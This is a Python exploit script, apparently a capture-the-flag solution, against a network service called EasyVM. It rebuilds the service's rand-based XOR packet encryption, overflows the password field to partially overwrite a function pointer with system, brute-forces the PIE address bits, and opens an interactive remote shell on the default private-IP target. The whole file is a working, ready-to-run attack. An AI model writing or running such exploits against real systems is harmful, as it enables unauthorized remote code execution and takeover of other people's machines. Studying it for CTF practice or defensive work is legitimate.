#!/usr/bin/env python3
"""
EasyVM Remote Exploit
Buffer overflow in password field to overwrite func_ptr with system@plt

Usage:
    python3 exploit_remote.py [host] [port]
    python3 exploit_remote.py                  # Uses default 172.24.83.24:9999
    python3 exploit_remote.py localhost 9999   # Local testing
"""

import socket
import struct
import ctypes
import time
import sys
import select

# Load libc for rand() to generate XOR table
libc = ctypes.CDLL('libc.so.6')

def init_xor_table(seed):
    """Initialize XOR table using libc srand/rand (matches binary)"""
    libc.srand(ctypes.c_uint(seed))
    xor_table = []
    for i in range(16):
        r = libc.rand()
        xor_table.append([r & 0xff, (r >> 8) & 0xff, (r >> 16) & 0xff, (r >> 24) & 0xff])
    return xor_table

def xor_encrypt(data, xor_table):
    """XOR encrypt data using the algorithm from binary at 0x23b0"""
    result = bytearray()
    edx = 0
    for byte_pair_idx in range(0, len(data), 2):
        ebp = byte_pair_idx
        row1 = edx & 0xf
        col1 = ebp & 2
        result.append(data[ebp] ^ xor_table[row1][col1])
        ecx = ((ebp & 2) >> 1) ^ 1
        ecx = ecx + edx
        if ebp + 1 < len(data):
            row2 = ecx & 0xf
            col2 = (ebp + 1) & 3
            result.append(data[ebp + 1] ^ xor_table[row2][col2])
        edx = ecx
    return bytes(result)

def recv_until(sock, marker, timeout=5):
    """Receive until marker found"""
    data = b''
    sock.settimeout(timeout)
    try:
        while marker not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def try_exploit(host, port, byte1, cmd_prefix=b'sh #'):
    """Single exploit attempt"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # Read initial output to get seed
        data = recv_until(sock, b'packet:')
        
        if b'connect:' not in data:
            sock.close()
            return None, "no seed"
        
        # Parse seed
        try:
            seed = int(data.split(b':')[1].split()[0])
        except:
            sock.close()
            return None, "bad seed"
        
        xor_table = init_xor_table(seed)
        
        session = struct.pack('>Q', 0xDEADBEEFCAFEBABE)
        
        # Build overflow password
        # 384 bytes to reach func_ptr, then 2-byte partial overwrite
        padding_len = 384 - len(cmd_prefix)
        password = cmd_prefix + b'A' * padding_len + bytes([0x60, byte1])
        
        username = b'x'
        cred_str = username + b':' + password + b';'
        payload = cred_str + session
        fake_payload_len = 390
        
        # Login packet
        login_packet = struct.pack('>II', 1, 0) + struct.pack('>I', fake_payload_len) + payload
        enc_login = xor_encrypt(login_packet, xor_table)
        
        sock.send(enc_login + b'\n')
        time.sleep(0.1)
        
        response = recv_until(sock, b'\n')
        if b'login ok' not in response:
            sock.close()
            return None, "login failed"
        
        # Execute packet - triggers func_ptr(password_buffer)
        exec_packet = struct.pack('>II', 1, 1) + session
        enc_exec = xor_encrypt(exec_packet, xor_table)
        
        sock.send(enc_exec + b'\n')
        time.sleep(0.2)
        
        # Test for shell
        sock.send(b'echo SHELL_OK_XYZ\n')
        time.sleep(0.2)
        
        response = recv_until(sock, b'\n', timeout=1)
        if b'SHELL_OK_XYZ' in response:
            return sock, "shell"
        
        sock.close()
        return None, "no shell"
        
    except Exception as e:
        try:
            sock.close()
        except:
            pass
        return None, str(e)

def interactive_shell(sock):
    """Interactive shell with remote socket"""
    print("[*] Interactive shell. Type commands, Ctrl+C to exit.")
    
    try:
        sock.setblocking(False)
        while True:
            readable, _, _ = select.select([sys.stdin, sock], [], [], 0.1)
            
            if sys.stdin in readable:
                cmd = sys.stdin.readline()
                if not cmd:
                    break
                sock.send(cmd.encode())
            
            if sock in readable:
                try:
                    data = sock.recv(4096)
                    if data:
                        sys.stdout.write(data.decode(errors='replace'))
                        sys.stdout.flush()
                    else:
                        print("\n[*] Connection closed")
                        break
                except:
                    pass
                    
    except KeyboardInterrupt:
        print("\n[*] Exiting...")

def main():
    # Parse arguments
    host = sys.argv[1] if len(sys.argv) > 1 else '172.24.83.24'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    
    print(f"[*] EasyVM Remote Exploit")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Vulnerability: Buffer overflow in password field")
    print(f"[*] Overwriting func_ptr from password_encoder (0x18a0) to system (0x1060)")
    print()
    
    # byte1 values for PIE brute force: 0x00, 0x10, 0x20, ... 0xf0
    byte1_values = [n << 4 for n in range(16)]
    
    attempt = 0
    max_attempts = 500
    
    while attempt < max_attempts:
        byte1 = byte1_values[attempt % 16]
        attempt += 1
        
        if attempt % 16 == 1:
            print(f"[*] Attempt {attempt}... (byte1=0x{byte1:02x})")
        
        sock, result = try_exploit(host, port, byte1)
        
        if sock is not None:
            print(f"[+] GOT SHELL! Attempt {attempt}, byte1=0x{byte1:02x}")
            interactive_shell(sock)
            sock.close()
            return 0
    
    print(f"[-] No shell after {max_attempts} attempts")
    return 1

if __name__ == '__main__':
    sys.exit(main())
